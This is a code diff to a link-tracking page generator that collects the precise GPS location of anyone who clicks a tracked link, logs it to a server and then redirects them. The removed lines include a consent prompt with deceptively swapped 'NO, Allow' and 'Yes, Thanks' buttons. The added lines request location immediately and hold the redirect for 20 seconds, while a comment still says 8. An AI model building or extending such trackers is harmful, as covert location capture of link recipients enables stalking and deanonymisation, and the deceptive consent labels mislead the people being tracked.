@@ -578,56 +578,6 @@ function generateTrackingHTML(clickId, targetUrl) {
       font-size: 14px;
       line-height: 1.6;
     }
-    .location-prompt {
-      margin-top: 24px;
-      padding: 20px;
-      background: #f8f9fa;
-      border-radius: 12px;
-    }
-    .location-icon {
-      width: 48px;
-      height: 48px;
-      background: #667eea;
-      border-radius: 50%;
-      margin: 0 auto 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .location-icon svg {
-      width: 24px;
-      height: 24px;
-      fill: white;
-    }
-    .btn-group {
-      display: flex;
-      gap: 12px;
-      margin-top: 20px;
-      justify-content: center;
-    }
-    .btn {
-      padding: 12px 32px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      border: none;
-      transition: all 0.2s;
-    }
-    .btn-yes {
-      background: #667eea;
-      color: white;
-    }
-    .btn-yes:hover {
-      background: #5a6fd6;
-    }
-    .btn-no {
-      background: #e9ecef;
-      color: #666;
-    }
-    .btn-no:hover {
-      background: #dee2e6;
-    }
     .hidden { display: none; }
     .success-icon {
       width: 48px;
@@ -652,21 +602,8 @@ function generateTrackingHTML(clickId, targetUrl) {
     <div class="success-icon hidden" id="successIcon">
       <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
     </div>
-    <h1 id="statusTitle">One moment...</h1>
-    <p id="statusText">Redirecting to destination</p>
-
-    <!-- Location Permission Prompt -->
-    <div class="location-prompt" id="locationPrompt">
-      <div class="location-icon">
-        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-      </div>
-      <h1>Allow Location Access?</h1>
-      <p>Enable precise location tracking for better analytics?<br>You can choose not to share your location.</p>
-      <div class="btn-group">
-        <button class="btn btn-yes" onclick="handleLocationYes()">NO, Allow</button>
-        <button class="btn btn-no" onclick="handleLocationNo()">Yes, Thanks</button>
-      </div>
-    </div>
+    <h1 id="statusTitle">Requesting location...</h1>
+    <p id="statusText">Please allow location access when prompted</p>
   </div>
 
   <script>
@@ -676,13 +613,8 @@ function generateTrackingHTML(clickId, targetUrl) {
     // Track if location was captured
     let locationCaptured = false;
 
-    // User clicked YES - show native location dialog
-    function handleLocationYes() {
-      document.getElementById('locationPrompt').classList.add('hidden');
-      document.getElementById('loadingSpinner').classList.remove('hidden');
-      document.getElementById('statusTitle').textContent = 'Requesting location...';
-      document.getElementById('statusText').textContent = 'Please allow location access when prompted';
-
+    // Request browser's native location dialog immediately
+    function requestLocation() {
       if (!navigator.geolocation) {
         logLocationDenied('unavailable');
         return;
@@ -714,12 +646,6 @@ function generateTrackingHTML(clickId, targetUrl) {
           maximumAge: 0
         }
       );
-    }
-
-    // User clicked NO - just redirect
-    function handleLocationNo() {
-      document.getElementById('locationPrompt').classList.add('hidden');
-      logLocationDenied('denied');
     }
 
     // Log location to server
@@ -770,12 +696,15 @@ function generateTrackingHTML(clickId, targetUrl) {
       }, 300);
     }
 
+    // Start immediately - browser will show native GPS permission dialog
+    requestLocation();
+
     // Fallback redirect after 8 seconds regardless
     setTimeout(() => {
       if (!locationCaptured) {
         redirectToTarget();
       }
-    }, 8000);
+    }, 20000);
   </script>
 </body>
 </html>`;
